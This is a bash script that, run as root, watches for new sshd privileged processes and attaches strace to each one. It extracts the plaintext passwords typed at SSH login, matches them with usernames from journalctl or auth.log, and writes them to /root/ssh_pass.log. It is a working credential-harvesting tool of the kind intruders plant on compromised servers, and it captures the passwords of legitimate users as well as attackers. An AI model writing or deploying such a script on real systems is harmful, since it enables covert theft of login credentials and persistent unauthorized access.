#!/bin/bash

# Function to attach to SSH process and extract password attempts
attach_ssh () {
    # Capture the lines containing password attempts by tracing the process
    PASSWORD_LINES=$(strace -p $1 2>&1 | grep 'read(6, \"\\f')

	# Extract lines containing the SSH username and port information from the auth.log file
	USERNAME_LINES=$(journalctl -u ssh.service | grep ssh[d].$pid.*port)

	if [[ -z "$USERNAME_LINES" ]]; then
		USERNAME_LINES=$(grep "ssh[d].$pid.*port" /var/log/auth.log)
	fi

	# Initialize a counter for password attempts
    COUNT=1

    # Print and log the username lines containing the user or IP information	
    echo "$USERNAME_LINES" | egrep --color "(user|for).(\w)*"   |tee -a /root/ssh_pass.log
	
	if [[ ! -z $sshloginpids ]]; then
		echo "No Password Attempt Found" |tee -a /root/ssh_pass.log
	else
		# Loop through each line containing a password attempt
		while IFS= read -r PLINE; do
		
			# Extract the password from the line and remove non-printable characters
			PASSWORD=$(printf "$PLINE" | tr -cd '[:print:]' | cut -f 2 -d \")
			
			# Print and log the password attempt with the corresponding count
			echo "Password Attempt $COUNT: \"$PASSWORD\""   | tee -a /root/ssh_pass.log
			
			# Increment the counter
			COUNT=$((COUNT+1))
		done <<< "$PASSWORD_LINES"
	fi
		
    # Print a separator line for better readability in the log file	
    echo "----------------------------------------------------" |tee -a /root/ssh_pass.log
}

# Check if strace is installed
if ! command -v strace >/dev/null 2>&1; then
    echo "strace is not installed. Please install it before running this script."
    exit 1
fi

# Check if running in an elevated context
if [[ $EUID -ne 0 ]]; then
    echo "This script requires elevated privileges. Please run it as root or using sudo."
    exit 1
fi

processed_pids=()  # Array to track processed PIDs

while true; do
    unset sshloginpids
    sshloginpids=$(ps aux | grep ss[h]d.*priv | awk '{print $2}')
    if [[ ! -z $sshloginpids ]]; then
        for pid in $sshloginpids; do
            # Check if PID has been processed before
            if [[ " ${processed_pids[*]} " != *" $pid "* ]]; then
                echo "Found Pid: $pid. Attaching..."
                processed_pids+=("$pid")  # Add PID to processed_pids array
                attach_ssh $pid &
            fi
        done
    fi
done



